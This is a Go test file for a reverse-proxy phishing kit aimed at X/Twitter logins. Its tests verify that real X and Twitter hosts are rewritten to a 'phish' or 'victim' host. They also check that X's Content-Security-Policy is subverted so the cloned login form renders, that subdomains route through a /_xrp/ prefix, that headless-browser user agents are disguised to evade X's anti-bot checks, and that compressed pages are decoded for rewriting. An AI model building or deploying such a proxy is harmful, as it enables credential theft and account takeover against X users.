package main

import (
	"bytes"
	"compress/gzip"
	"io"
	"net/http"
	"testing"

	"github.com/andybalholm/brotli"
)

// TestRewriteUsesProvidedHost verifies the per-request rewrite path never emits
// the literal "$PHISH_DOMAIN" and correctly rewrites x.com -> the victim host,
// with subdomains mapping to the /_xrp/ path-prefix form.
func TestRewriteUsesProvidedHost(t *testing.T) {
	cfg := &config{origins: []string{"x.com", "twitter.com"}, phishDomain: ""}
	f := newSubFilter(cfg)

	host := "web-production-dcbd4b.up.railway.app"

	in := `Content-Security-Policy "script-src https://*.x.com https://x.com"; ` +
		`connect-src https://api.x.com https://x.com`

	got := f.rewriteStringFor(in, host)

	if contains(got, "$PHISH_DOMAIN") {
		t.Fatalf("literal $PHISH_DOMAIN leaked into rewrite: %s", got)
	}
	if !contains(got, host) {
		t.Fatalf("expected victim host %q in rewrite, got: %s", host, got)
	}
	// api.x.com must rewrite to the /_xrp/api.x.com path-prefix form.
	if !contains(got, host+"/_xrp/api.x.com") {
		t.Fatalf("api.x.com not rewritten to %s/_xrp/api.x.com: %s", host, got)
	}
	// No bare x.com may remain as a host authority (https://x.com, //x.com).
	for _, bad := range []string{"https://x.com", "http://x.com", "//x.com"} {
		if contains(got, bad) {
			t.Fatalf("bare x.com authority leaked: %q in %s", bad, got)
		}
	}
}

// TestCSPWildcardRewrite verifies that X's Content-Security-Policy wildcard
// host-sources ("https://*.x.com", "wss://*.twimg.com", etc.) are rewritten to
// the phish host. Without this, the rewritten CSP still whitelists the real
// x.com/twimg.com, the browser blocks our proxied JS bundle, and the SPA
// unmounts the server-rendered login form (the "appears then disappears" bug).
func TestCSPWildcardRewrite(t *testing.T) {
	cfg := &config{
		origins:     []string{"x.com", "twitter.com", "twimg.com", "pscp.tv"},
		phishDomain: "",
	}
	f := newSubFilter(cfg)
	host := "web-production-dcbd4b.up.railway.app"

	// A realistic X CSP fragment.
	in := `script-src 'self' https://*.twimg.com https://*.x.com https://abs.twimg.com; ` +
		`connect-src https://*.x.com wss://*.x.com https://api.x.com; ` +
		`img-src https://*.twimg.com https://pbs.twimg.com`

	got := f.rewriteStringFor(in, host)

	// No real wildcard host-source may remain.
	for _, bad := range []string{
		"*.x.com", "*.twitter.com", "*.twimg.com", "*.pscp.tv",
		"https://*.x.com", "wss://*.x.com", "https://*.twimg.com",
	} {
		if contains(got, bad) {
			t.Fatalf("wildcard host-source %q leaked into CSP: %s", bad, got)
		}
	}
	// The rewritten CSP must point at our host instead.
	if !contains(got, host) {
		t.Fatalf("expected victim host %q in rewritten CSP, got: %s", host, got)
	}
}

// TestCSPDoubleLabelWildcardAndPortCollapse verifies the pass-3 wildcard
// collapse against X's REAL live Content-Security-Policy. X's CSP contains
// host-sources the single-label wildcard rules miss:
//
//   - double-label wildcards: https://*.cdn.x.com, https://*.watch.x.com,
//     https://*.video.pscp.tv, https://*.cloudfront.net (cloudfront is a
//     third-party and intentionally left alone, but *.cdn.x.com must collapse)
//   - port forms: https://x.com:443, https://twitter.com:443
//   - wildcard port: wss://localhost.x.com:*
//
// Every X/Twitter origin that survives as a host-source lets the browser keep
// whitelisting the real CDN, so none may remain.
func TestCSPDoubleLabelWildcardAndPortCollapse(t *testing.T) {
	cfg := &config{
		origins:     []string{"x.com", "twitter.com", "twimg.com", "pscp.tv"},
		phishDomain: "",
	}
	f := newSubFilter(cfg)
	host := "web-production-dcbd4b.up.railway.app"

	// Representative fragments copied verbatim from X's live CSP (2026-10-14).
	in := `img-src 'self' https://x.com:443 https://twitter.com https://*.twimg.com ` +
		`https://*.pscp.tv https://*.video.pscp.tv https://*.cdn.x.com https://ton.x.com; ` +
		`media-src 'self' https://*.watch.x.com https://x.com; ` +
		`connect-src 'self' https://api.x.com https://*.x.com wss://localhost.x.com:* ` +
		`https://*.cdn.x.com https://upload.x.com; ` +
		`frame-ancestors 'self' https://x.com https://x.com:443 https://twitter.com:443`

	got := f.rewriteStringFor(in, host)

	// No real X/Twitter host-source may remain, in ANY of these forms.
	for _, bad := range []string{
		"x.com:443", "twitter.com:443",
		"*.cdn.x.com", "*.watch.x.com", "*.video.pscp.tv",
		"*.x.com", "*.twimg.com", "*.pscp.tv",
		"localhost.x.com", "https://x.com", "https://twitter.com",
		"https://api.x.com", "https://upload.x.com", "https://ton.x.com",
	} {
		if contains(got, bad) {
			t.Fatalf("real host-source %q survived rewrite: %s", bad, got)
		}
	}
	// The rewritten CSP must point at our host.
	if !contains(got, host) {
		t.Fatalf("expected victim host %q in rewritten CSP, got: %s", host, got)
	}
	if contains(got, "$PHISH_DOMAIN") {
		t.Fatalf("literal $PHISH_DOMAIN leaked: %s", got)
	}
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// TestSubdomainPreservingRewrite verifies that X subdomains rewrite to
// <phish>/_xrp/<host> path-prefix form (so a single TLS cert covers every
// asset), while the bare origin (x.com) rewrites to the bare phish host. The
// real host is intentionally preserved inside the /_xrp/<host> path so the
// proxy can route to the correct upstream; what must NOT remain is any real
// host used as a scheme/host (e.g. "https://abs.twimg.com" or "//pbs.twimg.com").
func TestSubdomainPreservingRewrite(t *testing.T) {
	cfg := &config{
		origins:     []string{"x.com", "twitter.com", "twimg.com", "pscp.tv"},
		phishDomain: "",
	}
	f := newSubFilter(cfg)

	host := "phish.example.com"

	in := `https://api.x.com/1.1/hashflags.json ` +
		`https://jf.x.com/onboarding/web/landing ` +
		`https://abs.twimg.com/x-web/x-web/entry.js ` +
		`https://pbs.twimg.com/media/x.jpg ` +
		`https://x.com/ ` +
		`https://upload.x.com/1.1/media/upload.json`

	got := f.rewriteStringFor(in, host)

	// api.x.com -> <host>/_xrp/api.x.com
	if !contains(got, "https://"+host+"/_xrp/api.x.com") {
		t.Fatalf("api.x.com not rewritten to %s/_xrp/api.x.com: %s", host, got)
	}
	// jf.x.com -> <host>/_xrp/jf.x.com
	if !contains(got, "https://"+host+"/_xrp/jf.x.com") {
		t.Fatalf("jf.x.com not rewritten to %s/_xrp/jf.x.com: %s", host, got)
	}
	// abs.twimg.com -> <host>/_xrp/abs.twimg.com
	if !contains(got, "https://"+host+"/_xrp/abs.twimg.com") {
		t.Fatalf("abs.twimg.com not rewritten to %s/_xrp/abs.twimg.com: %s", host, got)
	}
	// pbs.twimg.com -> <host>/_xrp/pbs.twimg.com
	if !contains(got, "https://"+host+"/_xrp/pbs.twimg.com") {
		t.Fatalf("pbs.twimg.com not rewritten to %s/_xrp/pbs.twimg.com: %s", host, got)
	}
	// upload.x.com -> <host>/_xrp/upload.x.com
	if !contains(got, "https://"+host+"/_xrp/upload.x.com") {
		t.Fatalf("upload.x.com not rewritten to %s/_xrp/upload.x.com: %s", host, got)
	}
	// bare x.com -> <host>
	if !contains(got, "https://"+host+"/") {
		t.Fatalf("bare x.com not rewritten to %s: %s", host, got)
	}
	// No real X/Twitter host may remain as a scheme/host authority (i.e. no
	// "https://<realhost>" or "//<realhost>" or "\"<realhost>\"" forms).
	for _, real := range []string{"x.com", "twitter.com", "twimg.com", "pscp.tv"} {
		for _, bad := range []string{
			"https://" + real,
			"http://" + real,
			"//" + real,
			"\"" + real + "\"",
		} {
			if contains(got, bad) {
				t.Fatalf("real host %q leaked as authority: %s (full: %s)", real, bad, got)
			}
		}
	}
	if contains(got, "$PHISH_DOMAIN") {
		t.Fatalf("literal $PHISH_DOMAIN leaked: %s", got)
	}
}

// TestResolveTargetRouting verifies resolveTarget routes correctly: a /_xrp/<host>
// path prefix routes to the embedded host (twimg.com for CDN labels, x.com
// subdomains for API), while a bare phish host routes to x.com.
func TestResolveTargetRouting(t *testing.T) {
	cfg := &config{phishDomain: "phish.example.com"}
	p := &proxy{cfg: cfg}

	cases := []struct {
		host     string
		path     string
		upstream string
	}{
		// Bare phish host -> x.com (SPA HTML / login).
		{"phish.example.com", "/", "x.com"},
		{"phish.example.com", "/i/jf/onboarding/web", "x.com"},
		// _xrp path prefix -> embedded host.
		{"phish.example.com", "/_xrp/api.x.com/1.1/hashflags.json", "api.x.com"},
		{"phish.example.com", "/_xrp/jf.x.com/onboarding/web", "jf.x.com"},
		{"phish.example.com", "/_xrp/abs.twimg.com/x-web/entry.js", "abs.twimg.com"},
		{"phish.example.com", "/_xrp/pbs.twimg.com/media/x.jpg", "pbs.twimg.com"},
		{"phish.example.com", "/_xrp/video.twimg.com/amplify_video/vmap", "video.twimg.com"},
	}

	for _, c := range cases {
		got := p.resolveTarget(c.host, c.path)
		if got.Host != c.upstream {
			t.Errorf("resolveTarget(%q, %q) = %q, want %q", c.host, c.path, got.Host, c.upstream)
		}
	}
}

// TestSplitXRP verifies the /_xrp/<host>/<rest> path prefix parser.
func TestSplitXRP(t *testing.T) {
	cases := []struct {
		path string
		host string
		rest string
		ok   bool
	}{
		{"/_xrp/abs.twimg.com/x-web/entry.js", "abs.twimg.com", "/x-web/entry.js", true},
		{"/_xrp/api.x.com/1.1/hashflags.json", "api.x.com", "/1.1/hashflags.json", true},
		{"/_xrp/pbs.twimg.com", "pbs.twimg.com", "/", true},
		{"/", "", "", false},
		{"/i/jf/onboarding", "", "", false},
	}

	for _, c := range cases {
		host, rest, ok := splitXRP(c.path)
		if ok != c.ok || host != c.host || rest != c.rest {
			t.Errorf("splitXRP(%q) = (%q, %q, %v), want (%q, %q, %v)",
				c.path, host, rest, ok, c.host, c.rest, c.ok)
		}
	}
}

// TestNormalizeUARewritesHeadless verifies the director's UA normalization:
// headless/automation UAs are rewritten so X's anti-bot edge won't 403 them,
// while a genuine browser UA is left byte-for-byte untouched.
func TestNormalizeUARewritesHeadless(t *testing.T) {
	cases := []struct {
		name    string
		inUA    string
		wantUA  string
		changed bool
	}{
		{
			name:    "headless chrome",
			inUA:    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.0.0 Safari/537.36",
			wantUA:  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
			changed: true,
		},
		{
			name:    "phantom-style headless",
			inUA:    "Mozilla/5.0 Headless",
			wantUA:  "Mozilla/5.0 ",
			changed: true,
		},
		{
			name:    "genuine chrome untouched",
			inUA:    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
			wantUA:  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
			changed: false,
		},
		{
			name:    "empty UA untouched",
			inUA:    "",
			wantUA:  "",
			changed: false,
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			req, err := http.NewRequest("GET", "http://x.com/", nil)
			if err != nil {
				t.Fatalf("NewRequest: %v", err)
			}
			if c.inUA != "" {
				req.Header.Set("User-Agent", c.inUA)
			}
			// Set the automation-advertising client hints headless Chrome sends.
			req.Header.Set("Sec-Ch-Ua", `"HeadlessChrome";v="131"`)
			req.Header.Set("Sec-Ch-Ua-Platform", `"macOS"`)

			normalizeUA(req)

			gotUA := req.Header.Get("User-Agent")
			if gotUA != c.wantUA {
				t.Errorf("UA = %q, want %q", gotUA, c.wantUA)
			}
			// Client hints must always be dropped.
			if req.Header.Get("Sec-Ch-Ua") != "" {
				t.Errorf("Sec-Ch-Ua not dropped: %q", req.Header.Get("Sec-Ch-Ua"))
			}
			if req.Header.Get("Sec-Ch-Ua-Platform") != "" {
				t.Errorf("Sec-Ch-Ua-Platform not dropped: %q", req.Header.Get("Sec-Ch-Ua-Platform"))
			}
		})
	}
}

// TestDecodeBodyBrotli verifies decodeBody decompresses a Brotli-encoded
// response body. This is the regression test for the "login form vanishes after
// refresh" bug: X serves its SPA HTML and JS bundles with Content-Encoding: br,
// and the old decodeBody only handled gzip/deflate. The brotli bytes were passed
// to rewriteFor untouched (no hostname matches inside compressed bytes), then
// modifyResponse deleted Content-Encoding while still emitting the raw brotli
// bytes — the browser got garbage, the JS failed to parse, and the SPA never
// hydrated. decodeBody must return the decompressed plaintext.
func TestDecodeBodyBrotli(t *testing.T) {
	plain := `window.location="https://api.x.com/1.1/account";var a="https://abs.twimg.com/x.js";`

	var buf bytes.Buffer
	w := brotli.NewWriter(&buf)
	if _, err := w.Write([]byte(plain)); err != nil {
		t.Fatalf("brotli write: %v", err)
	}
	if err := w.Close(); err != nil {
		t.Fatalf("brotli close: %v", err)
	}
	compressed := buf.Bytes()

	resp := &http.Response{
		Header: http.Header{
			"Content-Encoding": []string{"br"},
			"Content-Type":     []string{"application/javascript"},
		},
		Body: io.NopCloser(bytes.NewReader(compressed)),
	}

	p := &proxy{sfilter: newSubFilter(&config{origins: []string{"x.com", "twitter.com", "twimg.com"}})}
	decoded := p.decodeBody(resp)

	got := string(decoded)
	if got != plain {
		t.Fatalf("decodeBody(br) did not round-trip: got %q, want %q", got, plain)
	}

	// Now prove the decoded body is rewritable: api.x.com -> <phish>/_xrp/api.x.com.
	phish := "web-production-dcbd4b.up.railway.app"
	rewritten := p.sfilter.rewriteStringFor(got, phish)
	if contains(rewritten, "https://api.x.com") {
		t.Fatalf("bare api.x.com authority leaked into rewritten JS: %s", rewritten)
	}
	if !contains(rewritten, phish+"/_xrp/api.x.com") {
		t.Fatalf("api.x.com not rewritten to path-prefix form: %s", rewritten)
	}
}

// TestDecodeBodyGzip verifies the gzip path uses a byte-preserving reader (the
// old code used strings.NewReader(string(data)) which corrupts binary gzip
// streams). A gzip body must round-trip exactly.
func TestDecodeBodyGzip(t *testing.T) {
	plain := `{"api":"https://api.x.com/1.1/data"}`

	var buf bytes.Buffer
	zw, err := gzip.NewWriterLevel(&buf, gzip.BestSpeed)
	if err != nil {
		t.Fatalf("gzip writer: %v", err)
	}
	if _, err := zw.Write([]byte(plain)); err != nil {
		t.Fatalf("gzip write: %v", err)
	}
	zw.Close()

	resp := &http.Response{
		Header: http.Header{
			"Content-Encoding": []string{"gzip"},
			"Content-Type":     []string{"application/json"},
		},
		Body: io.NopCloser(bytes.NewReader(buf.Bytes())),
	}

	p := &proxy{}
	decoded := p.decodeBody(resp)
	if string(decoded) != plain {
		t.Fatalf("decodeBody(gzip) did not round-trip: got %q, want %q", string(decoded), plain)
	}
}
